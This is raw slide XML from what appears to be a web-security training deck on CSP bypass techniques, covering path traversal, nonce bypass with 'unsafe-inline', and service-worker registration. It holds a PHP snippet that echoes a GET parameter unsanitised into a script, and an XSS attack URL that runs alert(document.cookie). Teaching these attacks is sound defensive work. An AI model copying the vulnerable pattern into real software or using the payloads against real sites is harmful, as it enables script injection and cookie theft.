              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>File is hosted on whitelisted domain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Path traversal bypasses directory restriction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1550" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2350"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser normalizes path and loads script</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84496" y="1047274"/>
            <a:ext cx="7418308" cy="408027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 6: 'unsafe-inline' with Nonce Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="1748790"/>
            <a:ext cx="2040017" cy="254913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="2135743"/>
            <a:ext cx="5431512" cy="469225"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1676400" y="2135743"/>
            <a:ext cx="5447705" cy="469225"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1839516" y="2258139"/>
            <a:ext cx="5121473" cy="224433"/>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Content-Security-Policy: script-src 'nonce-r4nd0m' 'unsafe-inline'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="2737009"/>
            <a:ext cx="2040017" cy="254913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable HTML:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="3123962"/>
            <a:ext cx="5431512" cy="2937986"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 833"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1676400" y="3123962"/>
            <a:ext cx="5447705" cy="2937986"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 833"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1839516" y="3246358"/>
            <a:ext cx="5121473" cy="2693194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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&lt;html&gt;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&lt;head&gt;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&lt;title&gt;Nonce Bypass Demo&lt;/title&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;script nonce="r4nd0m"&gt;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var data = "&lt;?php echo $_GET['data']; ?&gt;";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 More legitimate script logic...</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&lt;/script&gt;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&lt;/body&gt;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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="6193988"/>
            <a:ext cx="2040017" cy="254913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684496" y="6499021"/>
            <a:ext cx="5431512" cy="469225"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1676400" y="6499021"/>
            <a:ext cx="5447705" cy="469225"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5217"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1839516" y="6621417"/>
            <a:ext cx="5121473" cy="224433"/>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https://victim.com/?data=";alert(document.cookie);//</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7521773" y="1748790"/>
            <a:ext cx="2040017" cy="254913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7521773" y="2135743"/>
            <a:ext cx="5431512" cy="3162419"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 774"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7513677" y="2135743"/>
            <a:ext cx="5447705" cy="3162419"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 774"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7676793" y="2258139"/>
            <a:ext cx="5121473" cy="2917627"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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&lt;html&gt;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&lt;head&gt;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&lt;title&gt;Nonce Bypass Demo&lt;/title&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;script nonce="r4nd0m"&gt;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var data = "";alert(document.cookie);//";</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 More legitimate script logic...</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&lt;/script&gt;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&lt;/body&gt;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&lt;/html&gt;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 The alert(document.cookie) executes --&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7521773" y="5430203"/>
            <a:ext cx="2040017" cy="254913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7521773" y="5802511"/>
            <a:ext cx="5431512" cy="673531"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Script has valid nonce</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Injection inside nonce-protected script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP allows execution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72427" y="1160383"/>
            <a:ext cx="5032891" cy="365284"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 7: Service Worker Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="1563291"/>
            <a:ext cx="1827014" cy="228362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="1932861"/>
            <a:ext cx="10085427" cy="411361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5330"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265164" y="1932861"/>
            <a:ext cx="10099953" cy="411361"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5330"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2411254" y="2042398"/>
            <a:ext cx="9807773" cy="192286"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Content-Security-Policy: script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="2485430"/>
            <a:ext cx="1827014" cy="228362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="2949178"/>
            <a:ext cx="3553897" cy="228362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Register malicious service worker</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="3283387"/>
            <a:ext cx="4864418" cy="2526506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 868"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265164" y="3283387"/>
            <a:ext cx="4878943" cy="2526506"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 868"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2411254" y="3392924"/>
            <a:ext cx="4586764" cy="2307431"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;script&gt;</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if ('serviceWorker' in navigator)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navigator.serviceWorker.register('/sw.js').then(function(registration)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console.log('ServiceWorker registration successful with scope: ', registration.scope);</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}).catch(function(err)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console.log('ServiceWorker registration failed: ', err);</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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7500938" y="2949178"/>
            <a:ext cx="2591872" cy="228362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
